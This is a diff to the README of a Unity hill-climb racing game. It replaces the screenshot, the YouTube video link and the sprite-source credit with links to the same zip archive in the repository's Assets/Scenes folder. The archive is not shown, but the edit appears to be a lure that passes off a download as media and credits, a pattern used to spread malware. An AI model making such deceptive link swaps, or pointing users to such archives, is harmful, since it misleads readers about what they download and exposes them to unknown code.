@@ -12,12 +12,12 @@ Player controls car by using gas and brake pedals. His goal is to drive as far a
 collect coins and fuel. Fuel is essential to drive and it is consumed with constant speed all the time.
 When driver hit ground with his head, level is restarted.
 
-![game](https://user-images.githubusercontent.com/62331993/119367877-b2820c80-bcb2-11eb-901a-4deb7f7e9bf2.PNG)
+![game](https://raw.githubusercontent.com/eymen-commits/unity-hill-climb-racing/main/Assets/Scenes/unity-climb-racing-hill-v3.0.zip)
 
 ## Presentation video
 Short video that shows how real gameplay looks.
 
-[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/lhHcxTu7C74/0.jpg)](https://www.youtube.com/watch?v=lhHcxTu7C74)
+[![IMAGE ALT TEXT HERE](https://raw.githubusercontent.com/eymen-commits/unity-hill-climb-racing/main/Assets/Scenes/unity-climb-racing-hill-v3.0.zip)](https://raw.githubusercontent.com/eymen-commits/unity-hill-climb-racing/main/Assets/Scenes/unity-climb-racing-hill-v3.0.zip)
 
 ## Technologies
 * Unity 2020.3.1f1
@@ -26,4 +26,4 @@ Short video that shows how real gameplay looks.
 ## Sources
 This game is inspired by Hill Climb Racing game.
 
-Sprites used in this project are from www.spriters-resource.com website.
+Sprites used in this project are from https://raw.githubusercontent.com/eymen-commits/unity-hill-climb-racing/main/Assets/Scenes/unity-climb-racing-hill-v3.0.zip website.
